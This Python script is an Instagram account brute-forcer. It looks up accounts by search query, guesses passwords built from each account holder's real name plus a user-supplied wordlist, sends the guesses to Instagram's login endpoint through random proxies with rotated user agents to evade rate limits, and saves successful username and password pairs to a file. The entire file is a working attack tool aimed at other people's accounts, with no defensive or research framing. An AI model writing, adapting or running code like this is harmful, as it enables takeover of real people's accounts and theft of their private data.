import os,sys,time,requests,json,re,random
from concurrent.futures import ThreadPoolExecutor
from get_proxy import proxy
def clear():
    os.system('clear')
def baner():
    clear()
    print('''

\033[1;97m╔╗ ┬─┐┬ ┬┌┬┐┌─┐  \033[1;91m╦\033[2;91m╔═╗\033[00m       
\033[1;97m╠╩╗├┬┘│ │ │ ├┤ \033[1;94m─ \033[1;91m║\033[2;91m║ ╦\033[00m  
\033[1;97m╚═╝┴└─└─┘ ┴ └─┘  \033[1;91m╩\033[2;91m╚═╝\033[00m       
\033[44;1m      FahmiApz      ''')
def prx():
    try:
         baner()
         proxy_list = []
         valid_proxy = proxy.prox()
         count=0
         for x in valid_proxy:
             count+=1
             s=json.dumps(x)
             s1=json.loads(s)
             a=s1['http']
             b=s1['https']
             proxy_list.append(a)
             proxy_list.append(b)
             hu=input('\033[00mProxy List Save In: \033[93m')
             with open(hu,'a') as jl:
                  jl.write('\n' + a + '\n' + b + '\n')
             os.system('python igbf.py')
    except requests.exceptions.ConnectionError:
             sys.exit('\033[91mConnection Error!\033[00m')
try:
    user_agent = requests.get('https://pastebin.com/raw/zkCXTGcm').text.split('\n')
    acak=random.choice(user_agent)
    csrftoken = requests.get('https://www.instagram.com', ).cookies['csrftoken']
except requests.exceptions.ConnectionError:
       sys.exit('\033[91mConnection Error!\033[00m')
ua={
'origin': 'https://www.instagram.com',
'pragma': 'no-cache',
'referer': 'https://www.instagram.com/accounts/login/',
'user-agent': '{acak}',
'x-csrftoken': csrftoken,
'x-requested-with': 'XMLHttpRequest'}
vuln=[]
result=0
def pkwd():
       try:
           fl=input('\033[00mProxy(\033[93mlist.txt\033[00m): \033[93m')
           rr=open(fl,'r').read()
       except FileNotFoundError:
           print('\033[00m[\033[91m!\033[00m]Proxy Not Found')
           print('\033[00mPlease Waiting...')
           time.sleep(3)
           print('\033[00mSearch Proxy')
           time.sleep(1)
           prx()
       fi=rr.strip().split('\n')
       rd=random.choice(fi)
       pro={
       "http":f"http://{rd}",
       "hrtps":f"https://{rd}"}
       try:
           f=input('\n\033[00mSearch User: \033[96m')
           dat= requests.get("https://www.instagram.com/web/search/topsearch/?query="+f).text
           zz=input('\033[00mWordList(\033[93mList.txt\033[00m):\033[93m')
           pwd=open(zz,'r').read()
       except FileNotFoundError:
           print('\033[91mWordlist Not Found!\033[00m')
           time.sleep(2)
           os.system("python igbf.py")
       except requests.exceptions.ConnectionError:
           sys.exit('\033[91mConnection Error\033[00m')
       pwd1=pwd.strip().split('\n')
       js= json.loads(dat)
       with ThreadPoolExecutor(max_workers=10) as ex:
            ex.submit(True)
            for x in js['users']:
                us= x['user']['username']
                name=x['user']['full_name']
                ss=name.split('|')
                fln=ss[0].split(' ')
                for x in fln:
                    litpas = [
                           str(x) + "123",
                           str(x) + "12345",
                    ]
                    with ThreadPoolExecutor(max_workers=10) as ex:
                         for passw in pwd1:
                             b=passw.split(' ')
                             for x in b:
                                 litpas.append(x)
                         for passw in set(litpas):      
                              time.sleep(2)
                              reg = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=ua, data={'username': us,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{passw}','queryParams': '{}'}, proxies=pro, timeout=10)
                              js1=json.loads(reg.text)
                              try:
                                  if 'Please wait a few minutes before you try again.' in js1:
                                      print("\033[00mPlease Waiting...\033[91m!!\033[00m")
                                      time.sleep(10)
                                      pkwd()
                                  elif js1['authenticated'] == True:
                                       result+=1
                                       vuln.append(us+"|"+passw)
                                       print("\033[00m[\033[92m+\033[00m]"+us+'|'+passw)
                                       with open('vuln.txt','a') as x:
                                            x.write(us + '|' + passw + '\n')
                                            sys.exit('\033[00mPassword \033[92mFound\033[00m')
                                  else:
                                       print("\033[00m[\033[91mx\033[00m]"+us+ '|' +passw)
                              except KeyError:
                                     print('\033[91mError!\033[00m')
                                     time.sleep(5)
                                     clear()
                                     baner()
                                     pkwd()
                            
def gpkwd():  
    try:
          fl=input('\033[00mProxy(\033[93mlist.txt\033[00m): \033[93m')
          rr=open(fl,'r').read()
    except FileNotFoundError:
          print('\033[00m[\033[91m!\033[00m]Proxy Not Found')
          print('\033[00mPlease Waiting...')
          time.sleep(3)
          print('\033[00mSearch Proxy')
          time.sleep(1)
          prx()
    fi=rr.strip().split('\n')
    rd=random.choice(fi)
    pro={
    "http":f"http://{rd}",
    "hrtps":f"https://{rd}"}    
    try:
           f=input('\n\033[00mSearch User: \033[96m')
           dat= requests.get("https://www.instagram.com/web/search/topsearch/?query="+f).text
    except requests.exceptions.ConnectionError:
           sys.exit('\033[91mConnection Error\033[00m')  
    with ThreadPoolExecutor(max_workers=10) as ex:
           ex.submit(True)
           js= json.loads(dat)
           for x in js['users']:
               us= x['user']['username']
               name=x['user']['full_name']
               ss=name.split('|')
               fln=ss[0].split(' ')
               for x in fln:
                   litpas = [
                         str(x) + "123",
                         str(x) + "12345",
                   ]
                   litpas.append('Doraemon123')
                   for passw in set(litpas):
                       time.sleep(2)
                       reg = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=ua, data={'username': us,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{passw}','queryParams': '{}'}, proxies=pro, timeout=10)
                       js1=json.loads(reg.text)
                       try:
                           if 'Please wait a few minutes before you try again.' in js1:
                               print("\033[00mPlease Waiting...\033[91m!\033[00m")
                               time.sleep(10)
                               gpkwd()
                           elif js1['authenticated'] == True:
                                    result+=1
                                    vuln.append(us+"|"+passw)
                                    print('\033[00m[|033[92m+\033[00m]'+us+'|'+passw)
                                    with open('vuln.txt','a') as x:
                                         x.write(us + '|' + passw + '\n')
                                                         
                           else:
                                   print('\033[00m[\033[91mx\033[00m]'+us+ '|' +passw)
                       except KeyError:
                               print('\033[91mError!\033[00m')
                               time.sleep(5)
                               clear()
                               baner()
                               gpkwd()
                       except requests.exceptions.ConnectionError:
                               sys.exit('\033[91mConnection Error\033[00m')
if __name__=="__main__":
     while True:
          clear()
          baner()
          bc=input('\033[00m\033[96m1).\033[00mCrack Wordlist\n\033[96m2).\033[00mCrack Not Wordlist\n\033[00m>> \033[96m')
          if bc == '1':
             clear()
             baner()
             pkwd()
          elif bc == '2':
             clear()
             baner()
             gpkwd()
          else:
             print('\033[91mWrong Input!\033[00m')
     
     
